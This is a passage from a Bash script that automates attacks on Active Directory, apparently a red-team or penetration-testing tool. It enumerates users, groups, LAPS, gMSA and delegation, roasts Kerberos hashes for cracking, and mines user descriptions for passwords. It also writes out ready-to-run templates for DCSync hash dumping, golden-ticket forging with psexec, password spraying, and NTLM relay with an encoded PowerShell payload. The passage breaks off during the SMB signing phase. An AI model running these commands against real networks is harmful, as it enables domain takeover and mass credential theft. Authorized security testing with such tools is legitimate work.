    local ctx_out="${OUTDIR}/domain_context.txt"
    cmd_log "nxc smb ${DC_IP} ${NXC_AUTH[*]}"
    timeout 30 nxc smb "$DC_IP" "${NXC_AUTH[@]}" 2>&1 | tee "$ctx_out"

    if ! grep -qF '[+]' "$ctx_out"; then
        if [[ "$KERBEROS" == "true" || "$AUTH_TYPE" == "kerberos" ]]; then
            # nxc --use-kcache against a DC *IP* often shows no [+] even with a
            # valid ticket (Kerberos wants the FQDN). Don't abort the whole AD
            # run on an inconclusive check — warn and continue enumeration.
            warn "Kerberos credential validation inconclusive (no [+] vs ${DC_IP})"
            warn "  Kerberos needs the DC FQDN, not an IP — if enum fails, set -dc <DC_FQDN> and check KRB5CCNAME"
            echo "KERBEROS_VALIDATION=INCONCLUSIVE" >> "${OUTDIR}/summary_notes.txt"
            progress_log "WARN" "$phase_key" "kerberos validation inconclusive — continuing"
            return 0
        fi
        error "Credential validation FAILED — verify username/password/hash and domain"
        progress_log "FAIL" "$phase_key" "credential validation failed"
        return 1
    fi
    success "Credentials valid for ${AD_USER}@${DOMAIN}"
    creds_log "adr" "$DC_IP" "$AD_USER" "${PASS:-${HASH:-unknown}}" "validated"

    if grep -qF 'Pwn3d!' "$ctx_out"; then
        success "*** ADMIN ACCESS (Pwn3d!) — ${AD_USER} is local admin on DC ***"
        echo "ADMIN_ON_DC=YES" >> "${OUTDIR}/summary_notes.txt"
        # DCSync — full domain dump
        if [[ "$AUTH_TYPE" == "hash" ]]; then
            attack_cmd "DCSYNC — ADMIN ON DC DETECTED (dump all hashes)" \
                "impacket-secretsdump -just-dc ${DOMAIN}/${AD_USER}@${DC_IP} -hashes ${LM_NT_HASH}" \
                "nxc smb ${DC_IP} -u ${AD_USER} -H ${NT_HASH} --ntds   # faster, streams to stdout"
        else
            attack_cmd "DCSYNC — ADMIN ON DC DETECTED (dump all hashes)" \
                "impacket-secretsdump -just-dc ${DOMAIN}/${AD_USER}:${PASS}@${DC_IP}" \
                "nxc smb ${DC_IP} -u ${AD_USER} -p '${PASS}' --ntds   # faster, streams to stdout"
        fi
    fi

    # 1d. Password/lockout policy
    cmd_log "nxc smb ${DC_IP} ${NXC_AUTH[*]} --pass-pol"
    timeout 30 nxc smb "$DC_IP" "${NXC_AUTH[@]}" --pass-pol \
        > "${OUTDIR}/password_policy.txt" 2>&1
    if [[ -s "${OUTDIR}/password_policy.txt" ]]; then
        success "Password policy → password_policy.txt"
        grep -iE "lockout|threshold|badpwd|minimum" \
            "${OUTDIR}/password_policy.txt" 2>/dev/null \
            >> "${OUTDIR}/summary_notes.txt" || true
    fi

    # 1e. Domain SID + domain list via rpcclient
    if [[ "${TOOL_STATUS[rpcclient]}" == "ok" ]]; then
        build_rpc_auth
        cmd_log "rpcclient ${RPC_HASH_FLAG[*]} -U '${RPC_CRED}' ${DC_IP} -c lsaquery"
        timeout 30 rpcclient "${RPC_HASH_FLAG[@]}" \
            -U "$RPC_CRED" "$DC_IP" \
            -c "lsaquery" > "${OUTDIR}/domain_sid.txt" 2>&1 || true

        local sid
        sid=$(grep -oE 'S-1-5-[0-9-]+' "${OUTDIR}/domain_sid.txt" 2>/dev/null | head -1 || true)
        if [[ -n "$sid" ]]; then
            success "Domain SID: ${sid}"
            echo "DOMAIN_SID=${sid}" >> "${OUTDIR}/summary_notes.txt"
            # Golden ticket template — needs krbtgt hash (from DCSync)
            attack_cmd "GOLDEN TICKET (needs krbtgt NT hash from DCSync)" \
                "# After DCSync — get krbtgt NT hash:" \
                "grep krbtgt ${OUTDIR}/loot/*.txt 2>/dev/null | grep -oP '[a-fA-F0-9]{32}\$'" \
                "" \
                "# Forge golden ticket:" \
                "impacket-ticketer -nthash <KRBTGT_NT_HASH> -domain-sid ${sid} -domain ${DOMAIN} Administrator" \
                "export KRB5CCNAME=Administrator.ccache" \
                "impacket-psexec -k -no-pass ${DOMAIN}/Administrator@${DC_IP}"
        fi

        cmd_log "rpcclient ${RPC_HASH_FLAG[*]} -U '${RPC_CRED}' ${DC_IP} -c enumdomains"
        timeout 30 rpcclient "${RPC_HASH_FLAG[@]}" \
            -U "$RPC_CRED" "$DC_IP" \
            -c "enumdomains" >> "${OUTDIR}/domain_context.txt" 2>&1 || true
    else
        warn "rpcclient not available — skipping domain SID enumeration"
    fi

    # 1f. DNS LDAP SRV check
    if [[ "${TOOL_STATUS[dig]}" == "ok" ]]; then
        cmd_log "dig SRV _ldap._tcp.${DOMAIN} @${DC_IP}"
        timeout 10 dig SRV "_ldap._tcp.${DOMAIN}" "@${DC_IP}" \
            > "${OUTDIR}/dns_ldap_srv.txt" 2>&1 || true
        if grep -q "ANSWER SECTION" "${OUTDIR}/dns_ldap_srv.txt" 2>/dev/null; then
            success "LDAP SRV records confirmed"
        else
            warn "No LDAP SRV answer (non-critical)"
        fi
    fi

    # Seed attack_commands.txt with secretsdump template
    if [[ "$AUTH_TYPE" == "hash" ]]; then
        attack_cmd "SECRETSDUMP (after obtaining DA creds)" \
            "impacket-secretsdump -hashes ${LM_NT_HASH} ${DOMAIN}/${AD_USER}@${DC_IP}"
    else
        attack_cmd "SECRETSDUMP (after obtaining DA creds)" \
            "impacket-secretsdump ${DOMAIN}/${AD_USER}:${PASS}@${DC_IP}"
    fi

    progress_log "DONE" "$phase_key" "domain=${DOMAIN}"
}

#==============================================================================
# PHASE 2 — USER ENUMERATION
#==============================================================================
phase2_user_enum() {
    local phase_key="phase2_user_enum"
    if is_phase_done "$phase_key"; then
        info "Phase 2 already complete (--force to redo)"
        return 0
    fi

    phase "2 — User Enumeration"
    progress_log "START" "$phase_key" ""
    mkdir -p "${OUTDIR}/users" "${OUTDIR}/groups"

    build_nxc_auth
    local user_count=0

    # 2a. User list via nxc --users-export (clean file) + --users (display)
    cmd_log "nxc smb ${DC_IP} ${NXC_AUTH[*]} --users --users-export ${OUTDIR}/users/all_users.txt"
    timeout 60 nxc smb "$DC_IP" "${NXC_AUTH[@]}" \
        --users \
        --users-export "${OUTDIR}/users/all_users.txt" \
        > "${OUTDIR}/users/nxc_users_raw.txt" 2>&1 || true

    # 2b. rpcclient enumdomusers — more reliably parseable, cross-reference
    if [[ "${TOOL_STATUS[rpcclient]}" == "ok" ]]; then
        build_rpc_auth
        cmd_log "rpcclient ${RPC_HASH_FLAG[*]} -U '${RPC_CRED}' ${DC_IP} -c enumdomusers"
        timeout 60 rpcclient "${RPC_HASH_FLAG[@]}" \
            -U "$RPC_CRED" "$DC_IP" \
            -c "enumdomusers" > "${OUTDIR}/users/rpcclient_users.txt" 2>&1 || true

        # Parse: user:[username] rid:[0x...]
        grep -oP 'user:\[\K[^\]]+' \
            "${OUTDIR}/users/rpcclient_users.txt" \
            >> "${OUTDIR}/users/all_users.txt" 2>/dev/null || true
    fi

    # Deduplicate and sort
    if [[ -s "${OUTDIR}/users/all_users.txt" ]]; then
        sort -u "${OUTDIR}/users/all_users.txt" -o "${OUTDIR}/users/all_users.txt"
        user_count=$(wc -l < "${OUTDIR}/users/all_users.txt")
        success "User list: ${user_count} unique accounts → users/all_users.txt"
    else
        warn "User enumeration yielded no parseable output — check users/nxc_users_raw.txt"
    fi

    # 2c. LDAP detailed user query (password auth only — ldapsearch has no NTLM hash support)
    if [[ "$AUTH_TYPE" == "hash" ]]; then
        warn "ldapsearch skipped (no NTLM hash auth support) — user details unavailable"
    elif [[ "${TOOL_STATUS[ldapsearch]}" == "ok" ]]; then
        cmd_log "ldapsearch -x -H ldap://${DC_IP} -D '${AD_USER}@${DOMAIN}' -b '${BASE_DN}' '(objectClass=user)' sAMAccountName description pwdLastSet lastLogon userAccountControl"
        timeout 120 ldapsearch \
            -x \
            -H "ldap://${DC_IP}" \
            -D "${AD_USER}@${DOMAIN}" \
            -w "$PASS" \
            -b "$BASE_DN" \
            -E "pr=1000/noprompt" \
            "(objectClass=user)" \
            sAMAccountName description pwdLastSet lastLogon userAccountControl \
            > "${OUTDIR}/users/users_detail.txt" 2>&1 || true

        if [[ -s "${OUTDIR}/users/users_detail.txt" ]]; then
            success "LDAP user details → users/users_detail.txt"

            # Mine descriptions for credential keywords
            grep -i "^description:" "${OUTDIR}/users/users_detail.txt" 2>/dev/null \
                | grep -iE "pass|pwd|cred|key|secret|temp|welcome|login|admin|123|abc|P@ss" \
                > "${OUTDIR}/users/suspicious_descriptions.txt" 2>/dev/null || true

            if [[ -s "${OUTDIR}/users/suspicious_descriptions.txt" ]]; then
                success "*** CREDENTIAL KEYWORDS IN USER DESCRIPTIONS ***"
                cat "${OUTDIR}/users/suspicious_descriptions.txt"
                echo "CRED_IN_DESC=YES" >> "${OUTDIR}/summary_notes.txt"
            fi
        fi
    else
        warn "ldapsearch not available — skipping detailed user attributes"
    fi

    # 2d. Groups via nxc
    cmd_log "nxc smb ${DC_IP} ${NXC_AUTH[*]} --groups"
    timeout 60 nxc smb "$DC_IP" "${NXC_AUTH[@]}" --groups \
        > "${OUTDIR}/groups/all_groups.txt" 2>&1 || true
    success "Groups → groups/all_groups.txt"

    # 2e. Privileged group membership via rpcclient querygroupmem
    if [[ "${TOOL_STATUS[rpcclient]}" == "ok" ]]; then
        build_rpc_auth
        local priv_out="${OUTDIR}/groups/privileged_groups.txt"
        {
            echo "# Privileged Group Members"
            echo "# Generated: $(date)"
            echo "# RIDs: Domain Admins=512 Backup Operators=551 RDP=555 Account Ops=548 Server Ops=549"
            echo ""
        } > "$priv_out"

        # Group name → hex RID mappings
        local grp grp_rid
        declare -A priv_rids=(
            ["Domain Admins"]="0x200"
            ["Backup Operators"]="0x227"
            ["Remote Desktop Users"]="0x22b"
            ["Account Operators"]="0x224"
            ["Server Operators"]="0x225"
        )
        for grp in "${!priv_rids[@]}"; do
            grp_rid="${priv_rids[$grp]}"
            echo "=== ${grp} (RID ${grp_rid}) ===" >> "$priv_out"
            cmd_log "rpcclient -U '${RPC_CRED}' ${DC_IP} -c 'querygroupmem ${grp_rid}'"
            timeout 30 rpcclient "${RPC_HASH_FLAG[@]}" \
                -U "$RPC_CRED" "$DC_IP" \
                -c "querygroupmem ${grp_rid}" >> "$priv_out" 2>&1 || true
            echo "" >> "$priv_out"
        done
        success "Privileged groups → groups/privileged_groups.txt"

        # Flag Domain Admin members prominently
        local da_section
        da_section=$(grep -A20 "=== Domain Admins" "$priv_out" 2>/dev/null | \
            grep -v "^===" | grep -v "^$" | head -10 || true)
        if [[ -n "$da_section" ]]; then
            echo "DOMAIN_ADMINS=${da_section}" >> "${OUTDIR}/summary_notes.txt"
        fi

        # Extract member RIDs and resolve to usernames for spray targeting
        local priv_members_file="${OUTDIR}/groups/privileged_members_resolved.txt"
        if [[ -s "$priv_out" ]]; then
            info "  → Resolving privileged group member RIDs to usernames"
            grep -oP 'rid\[0x[0-9a-fA-F]+\]' "$priv_out" 2>/dev/null \
                | grep -oP '0x[0-9a-fA-F]+' \
                | sort -u \
                | while IFS= read -r rid_hex; do
                    local rid_dec
                    rid_dec=$(printf '%d' "$rid_hex" 2>/dev/null || true)
                    [[ -z "$rid_dec" ]] && continue
                    timeout 10 rpcclient "${RPC_HASH_FLAG[@]}" \
                        -U "$RPC_CRED" "$DC_IP" \
                        -c "queryuser ${rid_dec}" 2>/dev/null \
                        | grep -oP 'User Name\s*:\s*\K\S+' || true
                done > "$priv_members_file" 2>/dev/null || true

            local priv_count=0
            priv_count=$(wc -l < "$priv_members_file" 2>/dev/null); priv_count=${priv_count:-0}
            if (( priv_count > 0 )); then
                success "  ★ Privileged members resolved → groups/privileged_members_resolved.txt ($priv_count users)"
                head -10 "$priv_members_file" | sed 's/^/    /'
                attack_cmd "SPRAY AGAINST PRIVILEGED GROUP MEMBERS" \
                    "cat ${priv_members_file}" \
                    "nxc smb ${DC_IP} -u ${priv_members_file} -p 'CRACKED_PASS' -d ${DOMAIN} --continue-on-success" \
                    "${SCRIPT_DIR}/sprayr.sh -U ${priv_members_file} -p 'CRACKED_PASS' -t ${DC_IP}"
            fi
        fi
    fi

    # Password spray command template
    attack_cmd "SPRAY CRACKED PASSWORD (after cracking hashes)" \
        "nxc smb ${DC_IP} -u ${OUTDIR}/users/all_users.txt -p 'CRACKED_PASS' -d ${DOMAIN} --continue-on-success" \
        "# Hash spray:" \
        "nxc smb ${DC_IP} -u ${OUTDIR}/users/all_users.txt -H 'CRACKED_NT_HASH' -d ${DOMAIN} --continue-on-success"

    progress_log "DONE" "$phase_key" "users=${user_count}"
}

#==============================================================================
# PHASE 2b — TARGETED LDAP ENUMERATION (LAPS / gMSA / delegation / trusts / MAQ)
#==============================================================================
phase2b_ldap_enum() {
    local phase_key="phase2b_ldap_enum"
    if is_phase_done "$phase_key"; then
        info "Phase 2b already complete (--force to redo)"
        return 0
    fi

    phase "2b — Targeted LDAP Enumeration (LAPS / gMSA / delegation / trusts)"
    progress_log "START" "$phase_key" ""
    mkdir -p "${OUTDIR}/ldap"

    build_nxc_auth
    local ldap_dir="${OUTDIR}/ldap"

    # 2b.1 LAPS — local admin password reads (if operator has the right)
    cmd_log "nxc ldap ${DC_IP} ${NXC_AUTH[*]} --laps"
    timeout 60 nxc ldap "$DC_IP" "${NXC_AUTH[@]}" --laps \
        > "${ldap_dir}/laps.txt" 2>&1 || true
    if grep -qiE 'ms-mcs-admpwd|LAPS.*Password|laps.*:' "${ldap_dir}/laps.txt" 2>/dev/null; then
        success "*** LAPS PASSWORDS READABLE — see ldap/laps.txt ***"
        echo "LAPS_READABLE=YES" >> "${OUTDIR}/summary_notes.txt"
    else
        info "No LAPS passwords readable (or LAPS not deployed)"
    fi

    # 2b.2 gMSA — managed service account blob reads
    cmd_log "nxc ldap ${DC_IP} ${NXC_AUTH[*]} --gmsa"
    timeout 60 nxc ldap "$DC_IP" "${NXC_AUTH[@]}" --gmsa \
        > "${ldap_dir}/gmsa.txt" 2>&1 || true
    if grep -qiE 'gmsa|msds-managedpassword|Account:' "${ldap_dir}/gmsa.txt" 2>/dev/null; then
        success "gMSA information collected → ldap/gmsa.txt"
        if grep -qiE 'NTHASH|:[a-fA-F0-9]{32}' "${ldap_dir}/gmsa.txt" 2>/dev/null; then
            success "*** gMSA NT HASH RECOVERED — ldap/gmsa.txt ***"
            echo "GMSA_HASH=YES" >> "${OUTDIR}/summary_notes.txt"
        fi
    fi

    # 2b.3 Delegation paths — unconstrained, constrained, RBCD
    cmd_log "nxc ldap ${DC_IP} ${NXC_AUTH[*]} --find-delegation"
    timeout 60 nxc ldap "$DC_IP" "${NXC_AUTH[@]}" --find-delegation \
        > "${ldap_dir}/delegation.txt" 2>&1 || true
    if [[ -s "${ldap_dir}/delegation.txt" ]] && \
       grep -qiE 'Unconstrained|Constrained|RBCD|AllowedToDelegate' "${ldap_dir}/delegation.txt" 2>/dev/null; then
        success "Delegation paths found → ldap/delegation.txt"
        echo "DELEGATION_FOUND=YES" >> "${OUTDIR}/summary_notes.txt"
        grep -iE 'Unconstrained' "${ldap_dir}/delegation.txt" 2>/dev/null \
            && echo "UNCONSTRAINED_DELEGATION=YES" >> "${OUTDIR}/summary_notes.txt" || true
    fi

    cmd_log "nxc ldap ${DC_IP} ${NXC_AUTH[*]} --trusted-for-delegation"
    timeout 60 nxc ldap "$DC_IP" "${NXC_AUTH[@]}" --trusted-for-delegation \
        >> "${ldap_dir}/delegation.txt" 2>&1 || true

    # 2b.4 Accounts with PASSWD_NOTREQD
    cmd_log "nxc ldap ${DC_IP} ${NXC_AUTH[*]} --password-not-required"
    timeout 60 nxc ldap "$DC_IP" "${NXC_AUTH[@]}" --password-not-required \
        > "${ldap_dir}/passwd_notreqd.txt" 2>&1 || true
    if grep -qE '[a-zA-Z_.-]+\s*$' "${ldap_dir}/passwd_notreqd.txt" 2>/dev/null && \
       [[ -s "${ldap_dir}/passwd_notreqd.txt" ]]; then
        local pnr_count
        pnr_count=$(grep -cE '^\S' "${ldap_dir}/passwd_notreqd.txt" 2>/dev/null || echo 0)
        if (( pnr_count > 0 )); then
            info "Password-not-required accounts: ${pnr_count} → ldap/passwd_notreqd.txt"
            echo "PASSWD_NOTREQD=${pnr_count}" >> "${OUTDIR}/summary_notes.txt"
        fi
    fi

    # 2b.5 adminCount=1 (adminSDHolder-protected accounts)
    cmd_log "nxc ldap ${DC_IP} ${NXC_AUTH[*]} --admin-count"
    timeout 60 nxc ldap "$DC_IP" "${NXC_AUTH[@]}" --admin-count \
        > "${ldap_dir}/admin_count.txt" 2>&1 || true
    success "adminCount=1 accounts → ldap/admin_count.txt"

    # 2b.6 Domain trusts (multi-domain / forest targeting)
    cmd_log "nxc ldap ${DC_IP} ${NXC_AUTH[*]} -M enum_trusts"
    timeout 60 nxc ldap "$DC_IP" "${NXC_AUTH[@]}" -M enum_trusts \
        > "${ldap_dir}/trusts.txt" 2>&1 || true
    if grep -qiE 'trust|targetname' "${ldap_dir}/trusts.txt" 2>/dev/null; then
        success "Domain trusts enumerated → ldap/trusts.txt"
        echo "DOMAIN_TRUSTS=YES" >> "${OUTDIR}/summary_notes.txt"
    fi

    # 2b.7 Machine Account Quota (MAQ > 0 → noPac / sAMAccountName attack prep)
    if [[ "${TOOL_STATUS[ldapsearch]}" == "ok" && "$AUTH_TYPE" == "password" ]]; then
        cmd_log "ldapsearch -x -H ldap://${DC_IP} -D ${AD_USER}@${DOMAIN} -b ${BASE_DN} '(objectClass=domain)' ms-DS-MachineAccountQuota"
        timeout 30 ldapsearch \
            -x -H "ldap://${DC_IP}" \
            -D "${AD_USER}@${DOMAIN}" -w "$PASS" \
            -b "$BASE_DN" \
            "(objectClass=domain)" ms-DS-MachineAccountQuota \
            > "${ldap_dir}/machine_account_quota.txt" 2>&1 || true
        local maq
        maq=$(grep -oP 'ms-DS-MachineAccountQuota:\s*\K[0-9]+' "${ldap_dir}/machine_account_quota.txt" 2>/dev/null | head -1)
        if [[ -n "$maq" ]]; then
            info "MachineAccountQuota = ${maq}"
            echo "MAQ=${maq}" >> "${OUTDIR}/summary_notes.txt"
            if (( maq > 0 )); then
                success "*** MAQ=${maq} — any domain user can create computer accounts (noPac / RBCD prep) ***"
            fi
        fi
    else
        info "Skipping MAQ (ldapsearch required with password auth)"
    fi

    progress_log "DONE" "$phase_key" ""
}

#==============================================================================
# PHASE 2c — ADCS ENUMERATION (certipy-ad)
#==============================================================================
phase2c_adcs() {
    local phase_key="phase2c_adcs"
    if is_phase_done "$phase_key"; then
        info "Phase 2c already complete (--force to redo)"
        return 0
    fi

    phase "2c — ADCS Enumeration (certipy-ad find -vulnerable)"
    progress_log "START" "$phase_key" ""
    mkdir -p "${OUTDIR}/adcs"

    if ! command -v certipy-ad &>/dev/null; then
        warn "certipy-ad not installed — skipping ADCS enumeration"
        warn "Install: pipx install certipy-ad"
        progress_log "SKIP" "$phase_key" "certipy-ad not installed"
        return 0
    fi

    local certipy_args=(-u "${AD_USER}@${DOMAIN}" -dc-ip "$DC_IP" -stdout -vulnerable)
    if [[ "$AUTH_TYPE" == "hash" ]]; then
        certipy_args+=(-hashes "$LM_NT_HASH")
    elif [[ "$AUTH_TYPE" == "kerberos" ]]; then
        certipy_args+=(-k -no-pass)
    else
        certipy_args+=(-p "$PASS")
    fi

    cmd_log "certipy-ad find ${certipy_args[*]}"
    timeout 120 certipy-ad find "${certipy_args[@]}" \
        > "${OUTDIR}/adcs/certipy_find.txt" 2>&1 || true

    if grep -qiE 'ESC[0-9]+|Vulnerable' "${OUTDIR}/adcs/certipy_find.txt" 2>/dev/null; then
        success "*** ADCS VULNERABILITIES FOUND — adcs/certipy_find.txt ***"
        grep -iE 'ESC[0-9]+|Vulnerable|Enrollment' "${OUTDIR}/adcs/certipy_find.txt" \
            | head -20 | sed 's/^/  /'
        echo "ADCS_VULNERABLE=YES" >> "${OUTDIR}/summary_notes.txt"
    else
        info "No obvious ADCS vulnerabilities (or CA not present)"
    fi

    progress_log "DONE" "$phase_key" ""
}

#==============================================================================
# PHASE 3 — KERBEROS ATTACK PREP
#==============================================================================
phase3_kerberos() {
    local phase_key="phase3_kerberos"
    if is_phase_done "$phase_key"; then
        info "Phase 3 already complete (--force to redo)"
        return 0
    fi

    phase "3 — Kerberos Attack Prep (AS-REP Roast + Kerberoast)"
    progress_log "START" "$phase_key" ""
    mkdir -p "${OUTDIR}/hashes" "${OUTDIR}/users"

    build_impacket_auth
    local dc_host_arg=()
    [[ -n "$DC_HOST" ]] && dc_host_arg=(-dc-host "$DC_HOST")

    # 3a. AS-REP Roasting
    if [[ "${TOOL_STATUS[impacket-GetNPUsers]}" == "ok" ]]; then
        local asrep_file="${OUTDIR}/hashes/asreproast.txt"
        cmd_log "impacket-GetNPUsers ${IMPACKET_AUTH_ARGS[*]} ${dc_host_arg[*]} -dc-ip ${DC_IP} -request -format hashcat -outputfile ${asrep_file} ${IMPACKET_TARGET}"
        timeout 120 impacket-GetNPUsers \
            "${IMPACKET_AUTH_ARGS[@]}" \
            "${dc_host_arg[@]}" \
            -dc-ip "$DC_IP" \
            -request \
            -format hashcat \
            -outputfile "$asrep_file" \
            "$IMPACKET_TARGET" \
            > "${OUTDIR}/hashes/asrep_output.txt" 2>&1 || true

        local asrep_count=0
        if [[ -s "$asrep_file" ]]; then
            # shellcheck disable=SC2016  # $ is a literal regex anchor/char, not a variable
            asrep_count=$(grep -c '^\$krb5asrep' "$asrep_file" 2>/dev/null); asrep_count=${asrep_count:-0}
            success "*** AS-REP ROASTABLE: ${asrep_count} account(s) → hashes/asreproast.txt ***"
            echo "ASREP_COUNT=${asrep_count}" >> "${OUTDIR}/summary_notes.txt"
            creds_log "adr" "$DC_IP" "${asrep_count}_users" "see ${asrep_file}" "asrep"

            # Extract just the usernames; shellcheck disable=SC2016 (regex literal $)
            # shellcheck disable=SC2016
            grep -oP '(?<=\$krb5asrep\$23\$)[^@]+' "$asrep_file" 2>/dev/null \
                > "${OUTDIR}/users/asrep_candidates.txt" || true

            attack_cmd "CRACK AS-REP HASHES (hashcat mode 18200)" \
                "hashcat -m 18200 ${asrep_file} /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule" \
                "# Or via crackr.sh (auto-detects 18200):" \
                "${SCRIPT_DIR}/crackr.sh -f ${asrep_file}"
        else
            info "No AS-REP roastable accounts found"
            echo "ASREP_COUNT=0" >> "${OUTDIR}/summary_notes.txt"
        fi
    else
        warn "impacket-GetNPUsers not found — skipping AS-REP roasting"
    fi

    # 3b. Kerberoasting
    if [[ "${TOOL_STATUS[impacket-GetUserSPNs]}" == "ok" ]]; then
        local kerb_file="${OUTDIR}/hashes/kerberoast.txt"
        cmd_log "impacket-GetUserSPNs ${IMPACKET_AUTH_ARGS[*]} ${dc_host_arg[*]} -dc-ip ${DC_IP} -request -outputfile ${kerb_file} ${IMPACKET_TARGET}"
        timeout 120 impacket-GetUserSPNs \
            "${IMPACKET_AUTH_ARGS[@]}" \
            "${dc_host_arg[@]}" \
            -dc-ip "$DC_IP" \
            -request \
            -outputfile "$kerb_file" \
            "$IMPACKET_TARGET" \
            > "${OUTDIR}/hashes/kerberoast_output.txt" 2>&1 || true

        # GetUserSPNs prints SPN table to stdout — save it separately
        grep -iE "ServicePrincipalName|MemberOf|PasswordLastSet|sAMAccountName" \
            "${OUTDIR}/hashes/kerberoast_output.txt" 2>/dev/null \
            > "${OUTDIR}/users/kerberoastable.txt" || true

        local kerb_count=0
        if [[ -s "$kerb_file" ]]; then
            # shellcheck disable=SC2016  # $ is literal regex anchor, not a variable
            kerb_count=$(grep -c '^\$krb5tgs' "$kerb_file" 2>/dev/null); kerb_count=${kerb_count:-0}
            success "*** KERBEROASTABLE: ${kerb_count} account(s) → hashes/kerberoast.txt ***"
            echo "KERB_COUNT=${kerb_count}" >> "${OUTDIR}/summary_notes.txt"
            creds_log "adr" "$DC_IP" "${kerb_count}_users" "see ${kerb_file}" "kerberoast"

            attack_cmd "CRACK KERBEROAST HASHES (hashcat mode 13100)" \
                "hashcat -m 13100 ${kerb_file} /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule" \
                "# Or via crackr.sh (auto-detects 13100):" \
                "${SCRIPT_DIR}/crackr.sh -f ${kerb_file}"
        else
            info "No Kerberoastable accounts found"
            echo "KERB_COUNT=0" >> "${OUTDIR}/summary_notes.txt"
        fi
    else
        warn "impacket-GetUserSPNs not found — skipping Kerberoasting"
    fi

    progress_log "DONE" "$phase_key" ""
}

#==============================================================================
# PHASE 4 — COMPUTER ENUMERATION
#==============================================================================
phase4_computers() {
    local phase_key="phase4_computers"
    if is_phase_done "$phase_key"; then
        info "Phase 4 already complete (--force to redo)"
        return 0
    fi

    phase "4 — Computer Enumeration"
    progress_log "START" "$phase_key" ""
    mkdir -p "${OUTDIR}/computers"

    build_nxc_auth

    # 4a. nxc --computers
    cmd_log "nxc smb ${DC_IP} ${NXC_AUTH[*]} --computers"
    timeout 60 nxc smb "$DC_IP" "${NXC_AUTH[@]}" --computers \
        > "${OUTDIR}/computers/nxc_computers.txt" 2>&1 || true
    success "Computer list (nxc) → computers/nxc_computers.txt"

    # 4b. LDAP computer objects (password auth only)
    if [[ "$AUTH_TYPE" == "hash" ]]; then
        warn "ldapsearch skipped (hash auth) — using nxc computers only"
    elif [[ "${TOOL_STATUS[ldapsearch]}" == "ok" ]]; then
        cmd_log "ldapsearch -x -H ldap://${DC_IP} -D '${AD_USER}@${DOMAIN}' -b '${BASE_DN}' '(objectClass=computer)' dNSHostName operatingSystem operatingSystemVersion"
        timeout 120 ldapsearch \
            -x \
            -H "ldap://${DC_IP}" \
            -D "${AD_USER}@${DOMAIN}" \
            -w "$PASS" \
            -b "$BASE_DN" \
            -E "pr=1000/noprompt" \
            "(objectClass=computer)" \
            dNSHostName operatingSystem operatingSystemVersion \
            > "${OUTDIR}/computers/all_computers.txt" 2>&1 || true
        success "Computer details (LDAP) → computers/all_computers.txt"

        # Flag old/vulnerable OS versions
        grep -iE "2003|2008|2012|windows.?7|windows.?xp|vista" \
            "${OUTDIR}/computers/all_computers.txt" 2>/dev/null \
            > "${OUTDIR}/computers/old_os.txt" || true

        if [[ -s "${OUTDIR}/computers/old_os.txt" ]]; then
            success "*** LEGACY OS FOUND — high-value exploit targets ***"
            cat "${OUTDIR}/computers/old_os.txt"
            echo "OLD_OS=YES" >> "${OUTDIR}/summary_notes.txt"
        fi
    else
        warn "ldapsearch not available — computer OS details limited to nxc output"
    fi

    # 4c. rpcclient enumdomcomputers
    if [[ "${TOOL_STATUS[rpcclient]}" == "ok" ]]; then
        build_rpc_auth
        cmd_log "rpcclient ${RPC_HASH_FLAG[*]} -U '${RPC_CRED}' ${DC_IP} -c enumdomcomputers"
        timeout 60 rpcclient "${RPC_HASH_FLAG[@]}" \
            -U "$RPC_CRED" "$DC_IP" \
            -c "enumdomcomputers" \
            >> "${OUTDIR}/computers/all_computers.txt" 2>&1 || true
    fi

    progress_log "DONE" "$phase_key" ""
}

#==============================================================================
# PHASE 5 — SMB SIGNING CHECK
#==============================================================================
phase5_smb_signing() {
    local phase_key="phase5_smb_signing"
    if is_phase_done "$phase_key"; then
        info "Phase 5 already complete (--force to redo)"
        return 0
    fi

    phase "5 — SMB Signing Check (NTLM relay candidates)"
    progress_log "START" "$phase_key" ""

    build_nxc_auth
    local signing_out="${OUTDIR}/smb_signing.txt"
    local relay_list="${OUTDIR}/smb_no_signing.txt"

    # Build the scan target set: the DC plus every enumerated computer. Member
    # servers are the real relay candidates — the DC almost always has signing
    # required, so scanning only the DC finds nothing useful. Sources: LDAP
    # dNSHostName FQDNs and any IPv4s captured during computer enumeration.
    # Missing files are fine (degrades to a DC-only scan).
    local targets_file="${OUTDIR}/smb_signing_targets.txt"
    {
        printf '%s\n' "$DC_IP"
        grep -hoiP 'dNSHostName:\s*\K\S+' \
            "${OUTDIR}/computers/all_computers.txt" 2>/dev/null
        grep -hoE '([0-9]{1,3}\.){3}[0-9]{1,3}' \
            "${OUTDIR}/computers/all_computers.txt" \
            "${OUTDIR}/computers/nxc_computers.txt" 2>/dev/null
    } | grep -vE '^[[:space:]]*$' | sort -u > "$targets_file"
    local host_count; host_count=$(wc -l < "$targets_file" 2>/dev/null | tr -d ' ')
    info "SMB signing scan across ${host_count:-1} enumerated host(s) (DC + member servers)"

    # nxc accepts a file of targets (one per line) as the target argument.
    cmd_log "nxc smb ${targets_file} ${NXC_AUTH[*]}"
    timeout 120 nxc smb "$targets_file" "${NXC_AUTH[@]}" \
        > "$signing_out" 2>&1 || true

    # Generate relay candidate list across all scanned hosts
    cmd_log "nxc smb ${targets_file} ${NXC_AUTH[*]} --gen-relay-list ${relay_list}"
    timeout 120 nxc smb "$targets_file" "${NXC_AUTH[@]}" \
        --gen-relay-list "$relay_list" >> "$signing_out" 2>&1 || true

    success "SMB signing results → smb_signing.txt"

    if grep -qiE "signing:False" "$signing_out" 2>/dev/null; then
        success "*** SMB SIGNING DISABLED — NTLM RELAY POSSIBLE ***"
        info "Relay candidates (no signing) → ${relay_list}"
        echo "SMB_SIGNING_DISABLED=YES" >> "${OUTDIR}/summary_notes.txt"
        attack_cmd "NTLM RELAY (SMB signing disabled — relay to a host from smb_no_signing.txt)" \
            "# Relay TARGETS are the no-signing hosts (member servers), not the DC:" \
            "cat ${relay_list}" \
            "" \
            "# Capture hashes with Responder (on separate interface):" \
            "sudo responder -I tun0 -dwv" \
            "" \
            "# Or relay directly (no Responder) — point -tf at the candidate list:" \
            "sudo impacket-ntlmrelayx --no-http-server -smb2support -tf ${relay_list} -c 'whoami'" \
            "" \
            "# Relay with PowerShell payload (generate with msfvenom/reverse shell encoder):" \
            "sudo impacket-ntlmrelayx --no-http-server -smb2support -tf ${relay_list} -c 'powershell -enc BASE64_ENCODED_PAYLOAD'"
    else
        info "SMB signing appears enabled on all scanned hosts — relay not straightforward"
